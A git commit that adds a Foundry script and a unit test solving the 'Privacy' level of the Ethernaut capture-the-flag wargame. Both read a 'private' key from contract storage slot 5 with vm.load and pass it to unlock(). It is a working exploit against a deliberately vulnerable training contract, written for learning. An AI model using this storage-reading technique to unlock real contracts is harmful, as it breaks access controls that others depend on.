a911ba84319226c66944432ddc0d6dd6dc776611
Gabriel Rosa <gabr1sr@proton.me>
2023-11-01 03:57:57 -0300

    add: challenge 12
    Adding Privacy challenge (level 12) contracts: challenge, factory,
    script, and unit test.

---
+++ script/Privacy.s.sol
@@ -0,0 +1,20 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import {Script, console} from "forge-std/Script.sol";
+import {Privacy} from "../src/levels/Privacy.sol";
+
+contract PrivacyScript is Script {
+    Privacy instance = Privacy(payable(0x674D4cF4CC07754Df3BdF8DBDE734CB84413D300));
+
+    function run() external {
+	vm.startBroadcast();
+	console.log("Privacy Contract is locked?", instance.locked());
+	console.log("Retrieving key...");
+	bytes32 key = vm.load(address(instance), bytes32(uint256(5)));
+	console.log("Unlocking...");
+	instance.unlock(bytes16(key));
+	console.log("Privacy Contract is already locked?", instance.locked());
+	vm.stopBroadcast();
+    }
+}
---
+++ test/Privacy.t.sol
@@ -0,0 +1,21 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import {EthernautTest} from "./utils/EthernautTest.sol";
+import {PrivacyFactory} from "../src/factories/PrivacyFactory.sol";
+import {Privacy} from "../src/levels/Privacy.sol";
+
+contract PrivacyTest is EthernautTest {
+    function setUpLevel() public override {
+	PrivacyFactory factory = new PrivacyFactory();
+	ethernaut.registerLevel(factory);
+	levelAddress = ethernaut.createLevelInstance(factory);
+    }
+
+    function testSolvePrivacy() public {
+	Privacy instance = Privacy(payable(levelAddress));
+	bytes32 data = vm.load(levelAddress, bytes32(uint256(5)));
+        instance.unlock(bytes16(data));
+	assert(ethernaut.submitLevelInstance(payable(levelAddress)));
+    }
+}
